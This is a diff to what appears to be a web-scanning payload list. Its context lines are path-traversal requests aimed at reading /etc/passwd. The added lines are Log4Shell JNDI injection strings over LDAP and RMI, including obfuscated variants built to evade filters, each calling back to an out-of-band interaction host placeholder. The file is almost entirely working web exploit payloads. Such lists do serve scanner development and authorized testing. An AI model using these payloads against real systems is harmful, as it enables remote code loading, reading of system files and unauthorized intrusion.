@@ -20,3 +20,11 @@
 /file?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
 /file?name=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
 /?q=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
+/?test=${jndi:ldap://{{interactsh-url}}/a}
+/?test=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{interactsh-url}}/poc}
+/?test=${${::-j}ndi:rmi://{{interactsh-url}}/ass}
+/?test=${jndi:rmi://{{interactsh-url}}}
+/?test=${${lower:jndi}:${lower:rmi}://{{interactsh-url}}/poc}
+/?test=${${lower:${lower:jndi}}:${lower:rmi}://{{interactsh-url}}/poc}
+/?test=${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{interactsh-url}}/poc}
+/?test=${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{interactsh-url}}/poc}
